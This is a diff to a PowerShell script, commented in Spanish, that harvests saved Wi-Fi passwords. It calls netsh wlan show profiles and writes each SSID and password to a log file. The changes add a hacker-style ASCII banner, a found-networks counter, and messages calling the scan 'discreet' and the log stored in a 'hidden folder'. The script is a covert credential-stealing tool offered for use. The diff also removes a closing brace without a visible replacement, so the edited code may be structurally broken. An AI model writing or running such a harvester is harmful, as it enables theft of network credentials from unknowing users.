@@ -61,6 +61,16 @@ try {
 "@
     $header | Add-Content -Path $outputFilePath -Encoding UTF8
 } catch { }
+Write-Host @"
+   _  _ _ ___ _    ___             _             ___ _               _   
+  | || (_) __(_)  / __|_ __  ___ _| |_ ___ _ _ / __| |_  ___  ___ _| |_ 
+  | __ | | _|| |  \__ \ '_ \/ -_) _|  _/ -_) '_| (_ | ' \/ _ \(_- <|  _|
+  |_||_|_|_| |_|  |___/ .__/\___|\__|\__\___|_|  \___|_||_\___//__/ \__|
+                      |_| Universal Engine v2.0
+"@ -ForegroundColor Yellow
+
+$foundCount = 0
+Write-Host "Iniciando escaneo discreto..." -ForegroundColor Cyan
 
 # Obtener perfiles - Regex agnostico (indentacion 4+ y colon)
 $profilesOutput = (netsh wlan show profiles 2>$null)
@@ -89,7 +99,10 @@ if ($profileLines) {
                 "SSID: $profileName" | Add-Content -Path $outputFilePath -Encoding UTF8
                 "PWD: $password" | Add-Content -Path $outputFilePath -Encoding UTF8
                 "-----------------------------------------" | Add-Content -Path $outputFilePath -Encoding UTF8
+                $foundCount++
             } catch { }
         }
-    }
+    Write-Host "-----------------------------------------" -ForegroundColor DarkGray
+    Write-Host "Escaneo completado. Se encontraron $foundCount redes." -ForegroundColor Green
+    Write-Host "Log generado en la carpeta oculta: $FolderName" -ForegroundColor Cyan
 }
